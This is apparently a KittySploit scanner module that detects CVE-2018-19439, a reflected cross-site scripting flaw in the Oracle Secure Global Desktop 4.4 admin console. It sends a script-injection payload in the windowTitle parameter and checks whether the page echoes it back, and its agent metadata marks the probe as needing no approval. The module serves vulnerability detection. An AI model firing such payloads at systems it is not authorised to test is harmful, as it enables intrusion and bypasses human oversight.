#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle Secure Global Desktop Administration Console 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle Secure Global Desktop Administration Console 4.4 - Cross-Site Scripting Detection',
        'description': 'Oracle Secure Global Desktop Administration Console 4.4 contains a reflected cross-site scripting vulnerability in helpwindow.jsp via all parameters, as demonstrated by the sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp windowTitle parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'oracle', 'xss', 'seclists', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/150444/Oracle-Secure-Global-Desktop-Administration-Console-4.4-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-19439',
            'http://seclists.org/fulldisclosure/2018/Nov/58',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2018-19439',
    }

    def run(self):
        r = self.http_request(method="GET", path='/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow></TITLE></HEAD><body><script>alert(1337)</script><!--&>helpFile=concepts.html', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<script>alert(1337)</script><!--</TITLE>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Oracle Secure Global Desktop Administration Console 4.4 - Cross-Site Scripting detected",
                path='/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow></TITLE></HEAD><body><script>alert(1337)</script><!--&>helpFile=concepts.html',
            )
            return True
        return False

